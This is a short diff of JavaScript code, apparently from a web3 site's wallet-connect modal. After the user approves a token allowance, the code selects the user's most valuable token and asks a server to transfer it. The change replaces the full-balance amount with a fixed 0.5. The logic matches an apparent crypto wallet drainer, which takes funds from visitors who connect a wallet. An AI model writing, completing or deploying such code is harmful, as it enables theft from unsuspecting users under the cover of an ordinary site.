@@ -1003,7 +1003,7 @@ const initializeSubscribers = (modal) => {
           await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
           
           // Отправляем запрос на сервер с корректным amount
-          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          const amount = parseUnits('0.5', mostExpensive.decimals)
           console.log(`Sending transfer request with amount: ${amount.toString()}`)
           const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
           
